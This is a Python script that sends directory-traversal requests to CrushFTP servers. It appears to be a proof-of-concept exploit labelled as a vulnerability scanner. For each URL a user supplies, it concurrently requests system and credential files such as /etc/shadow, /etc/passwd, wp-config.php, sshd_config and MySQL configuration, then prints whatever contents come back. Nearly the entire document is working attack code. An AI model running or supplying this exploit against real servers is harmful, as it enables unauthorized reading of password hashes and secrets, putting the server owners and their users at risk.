import requests
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor

# Function to validate URL
def is_valid_url(url):
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except ValueError:
        return False

# Function to scan for vulnerabilities
def scan_for_vulnerability(url, target_file):
    try:
        full_url = f"{url}/?/../../../../../../../../../../{target_file.lstrip('/')}"
        response = requests.get(full_url, timeout=10)
        if response.status_code == 200 and target_file.split('/')[-1] in response.text:
            print(f"Vulnerability detected in file: {target_file} for URL: {url}")
            print(f"Content of file {target_file}:")
            print(response.text)
        else:
            print(f"No vulnerability detected or unexpected response for file: {target_file} for URL: {url}")
    except requests.exceptions.RequestException as e:
        print(f"Error connecting to the server: {e} for URL: {url}")

# User input
input_urls = input("Enter the URLs of the CrushFTP servers separated by commas: ")
urls = input_urls.split(',')

# Validate the URLs
valid_urls = [url.strip() for url in urls if is_valid_url(url)]
if valid_urls:
    target_files = [
        "/var/www/html/index.php",
        "/var/www/html/wp-config.php",
        "/etc/passwd",
        "/etc/shadow",
        "/etc/hosts",
        "/etc/ssh/sshd_config",
        "/etc/mysql/my.cnf",
        # Add more files as needed
    ]

    # Scan for vulnerabilities concurrently
    with ThreadPoolExecutor(max_workers=5) as executor:
        for url in valid_urls:
            executor.map(scan_for_vulnerability, [url]*len(target_files), target_files)
else:
    print("No valid URLs entered. Please enter valid URLs separated by commas.")
